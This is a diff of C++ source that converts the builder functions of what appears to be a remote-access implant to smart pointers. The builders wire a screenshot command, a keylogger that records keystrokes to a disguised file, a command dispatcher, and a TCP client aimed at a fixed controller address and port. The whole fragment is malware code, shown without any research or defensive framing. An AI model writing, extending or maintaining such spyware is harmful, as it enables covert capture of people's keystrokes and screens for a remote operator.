@@ -4,43 +4,40 @@
 #include "command/execute/KeyloggerExecuter.h"
 #include "methods/keylogger/Keylogger.h"
 #include "methods/keylogger/KeysRecorder.h"
-#include "methods/keylogger/IKeyloggerImplementation.h"
 #include "networking/WinsockTCPClient.h"
+#include "stl/unique.h"
 
 
-
-command::ICommandExecuter*
+std::unique_ptr<command::ICommandExecuter>
 utils::builders::BuildScreenshotExecuter()
 {
-    return ( new command::ScreenshotExecuter(1) );
+    return ( std::make_unique<command::ScreenshotExecuter>(1) );
 }
 
-command::ICommandExecuter*
+std::unique_ptr<command::ICommandExecuter>
 utils::builders::BuildKeyloggerExecuter()
 {
-    using namespace methods::keylogger;
+    auto impl = std::make_unique<methods::keylogger::KeysRecorder>(
+        "harta_mashu_hazak.blk");
 
-    IKeyloggerImplementation *impl = new KeysRecorder("harta_mashu_hazak.blk");
-
-    Keylogger keylogger( impl );
-
-    return ( new command::KeyloggerExecuter(2, std::move(keylogger)) );
+    return ( std::make_unique<command::KeyloggerExecuter>(
+        2, methods::keylogger::Keylogger(impl.release())) );
 }
 
-command::CommandManager*
+std::unique_ptr<command::CommandManager>
 utils::builders::BuildManager()
 {
-    command::CommandManager *dispatcher = new command::CommandManager();
+    auto dispatcher = std::make_unique<command::CommandManager>();
 
-    dispatcher->Add(BuildScreenshotExecuter());
-    dispatcher->Add(BuildKeyloggerExecuter());
+    dispatcher->Add(BuildScreenshotExecuter().release());
+    dispatcher->Add(BuildKeyloggerExecuter().release());
 
     return ( dispatcher );
 }
 
-networking::WinsockTCPClient*
+std::unique_ptr<networking::WinsockTCPClient>
 utils::builders::BuildClient()
 {
-    return ( new networking::WinsockTCPClient("192.168.1.17", 12121) );
+    return ( std::make_unique<networking::WinsockTCPClient>("192.168.1.17", 12121) );
 }
 
